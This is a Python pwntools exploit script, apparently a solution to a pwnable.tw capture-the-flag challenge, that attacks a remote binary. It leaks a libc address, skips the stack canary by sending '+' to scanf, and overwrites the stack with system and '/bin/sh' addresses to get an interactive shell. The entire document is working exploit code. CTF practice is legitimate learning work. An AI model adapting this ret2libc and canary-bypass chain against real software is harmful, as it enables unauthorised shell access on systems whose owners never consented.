from pwn import *
server = remote('chall.pwnable.tw', 10101)

libc = ELF('./libc_32.so.6')
#readelf -S libc_32.so.6
got_plt_offset = 0x1b0000

# leak libc address
payload = 'a'*24
server.recv()
server.sendline(payload)
libc_addr = u32(server.recv()[30:34]) - 0xa
libcbase_addr = libc_addr - got_plt_offset
sys_addr = libcbase_addr + libc.symbols['system']
bin_sh_addr = libcbase_addr + libc.search('/bin/sh').next()

server.sendline('35')
server.recv()

# 24 bytes to go before canary
for i in range(24):
    server.sendline('0')
    server.recv()

# '+' is a legal input but won't be written to the stack
# thus we can use it to surpass the canary
server.sendline('+')
server.recv()

for i in range(9):
    server.sendline(str(sys_addr))
    server.recv()

server.sendline(str(bin_sh_addr))
server.recv()

server.interactive()